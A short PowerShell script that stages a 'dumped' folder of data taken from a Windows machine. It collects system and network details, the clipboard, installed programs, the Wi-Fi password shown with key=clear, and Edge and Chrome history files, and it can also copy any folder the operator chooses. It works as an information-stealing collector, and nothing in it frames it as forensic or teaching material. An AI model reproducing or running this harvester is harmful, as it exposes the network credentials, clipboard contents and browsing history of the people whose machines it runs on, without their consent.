mkdir dumped -Force #All collected data is stored in here.
mkdir dumped/edge -Force #All the MS edge data is stored here.
mkdir dumped/chrome -Force #All Google Chrome data is stored here.
mkdir dumped/wantedfolder -Force #Desired Path contents are stored here.

#Below is just standard system and network info.
arp -a > dumped/iplist.txt 
ipconfig > dumped/ipconfig.txt 
ipconfig /displaydns > dumped/dnsdisplay.txt 
systeminfo > dumped/sysinfo.txt 
tasklist > dumped/tasklist.txt
Get-Clipboard > dumped/clipboard.txt
Get-ChildItem -Path "C:\Program Files" | Select-Object Name > dumped/applist.txt
Get-ChildItem -Path "C:\Program Files (x86)" | Select-Object Name > dumped/applist86.txt


#This gets network information by checking the network name and getting the info based on that.
$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name 
Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt


try {
    #This command copies edge history data to dumped/edge
    $source_path_edge="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
    $destination_path_edge="dumped\edge"
    Copy-Item -Path $source_path_edge -Destination $destination_path_edge -Force -ErrorAction Stop 
}
catch {
    Write-Host "Edge Is not installed on this device, or the history folder is not available."
}

#The reason we make the error action stop for the history data retreivers is so try catch can catch them and write a message.

try {
    #This command copies chrome history data to dumped/chrome.
    $source_path_chrome="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
    $destination_path_chrome="dumped\chrome"
    Copy-Item -Path $source_path_chrome -Destination $destination_path_chrome -Force -ErrorAction Stop
}
catch {
    Write-Host "Google Chrome is not installed on this device, or the history folder is not available."
}


Write-Host "Do you want to copy a folder? (y/n):"
$copy_permission = Read-Host #This variable asks for input of the user which could be y or n. This is used in the coming if-statement

if ($copy_permission -eq "y") {
    #Asks user for desired path to copy and then copies it and its contents.
    Write-Output "Write your desired path to copy:"
    $wantedpath=Read-Host
    $wantedcopy="dumped/wantedfolder"
    Copy-Item -Path $wantedpath -Destination $wantedcopy -Recurse -Force -ErrorAction Continue
}

if ($copy_permission -eq "n"){
    Write-Host "Continuing on with the program."
}

